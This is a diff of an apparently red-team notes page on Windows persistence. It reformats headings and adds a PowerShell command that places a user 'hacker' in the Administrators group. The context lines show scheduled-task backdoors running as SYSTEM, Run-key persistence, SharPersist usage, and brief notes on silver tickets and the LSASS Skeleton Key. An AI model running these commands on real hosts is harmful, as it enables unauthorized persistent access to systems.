@@ -1,6 +1,6 @@
 # Windows
 
-## Windows
+## Guides
 
 3 good guides:
 
@@ -10,7 +10,7 @@
 
 {% embed url="https://www.mdsec.co.uk/2019/05/persistence-the-continued-or-prolonged-existence-of-something-part-3-wmi-event-subscription/" %}
 
-### Add User
+## Add User
 
 Commands: 
 
@@ -22,9 +22,13 @@ Change user password
 
 `net user USERNAME *` 
 
-### Scheduled task
+Using Powershell:
 
-#### SharpPresist: 
+`Add-LocalGroupMember -Group Administrators -Member hacker`
+
+## Scheduled task
+
+### SharpPresist
 
 [https://github.com/fireeye/SharPersist](https://github.com/fireeye/SharPersist) 
 
@@ -40,7 +44,7 @@ Delete a Scheduled task:
 
 `SharPersist -t schtask -n "Test" -m remove` 
 
-#### PowerShell 
+### PowerShell 
 
 ```text
 PS C:\> $A = New-ScheduledTaskAction -Execute "cmd.exe" -Argument "/c C:\Users\Rasta\AppData\Local\Temp\backdoor.exe" 
@@ -51,13 +55,13 @@ PS C:\> $D = New-ScheduledTask -Action $A -Trigger $T -Principal $P -Settings $S
 PS C:\> Register-ScheduledTask Backdoor -InputObject $D 
 ```
 
-#### Command Line 
+### Command Line 
 
 `shell schtasks /create /tn Test /tr "c:\windows\system32\cmd.exe /c c:\Users\JOHN\Downloads\backdoor.exe" /sc onlogon /ru System` 
 
-### Registry Key
+## Registry Key
 
-#### SharpPresist: 
+### SharpPresist: 
 
 [https://github.com/fireeye/SharPersist](https://github.com/fireeye/SharPersist) 
 
@@ -69,7 +73,7 @@ Delete a Registry Key:
 
 `SharPersist -t reg -k "hkcurun" -v "Test Stuff" -m remove` 
 
-#### Command Line 
+### Command Line 
 
 `shell reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run" /v Test /t REG_SZ /d "C:\Windows\System32\cmd.exe"` 
 
@@ -77,17 +81,17 @@ Delete:
 
 `reg delete  Registry_key_path /v Registry_value_name` 
 
-### Accessibility Features
+## Accessibility Features
 
 The accessibility features provide additional options \(on screen keyboards, magnifier, screen reading etc.\) that could assist people with disabilities to use Windows operating systems easier. However, this functionality can be abused to achieve persistence on a host that RDP is enabled and Administrator level privileges have been obtained. This technique touches the disk, or modification of the registry is required to execute a stored remotely payload. 
 
 {% embed url="https://pentestlab.blog/2019/11/13/persistence-accessibility-features/" %}
 
-### Silver Tickets
+## Silver Tickets
 
 Computers change their account passwords every 30 days, but this is initialized by the client, not Active Directory. extract the host computer account hash, set a specific registry key, and you can regain access indefinitely. 
 
-### Skeleton Key
+## Skeleton Key
 
 The method injects itself into LSASS and creates a master password that will work for any account in the domain.
 
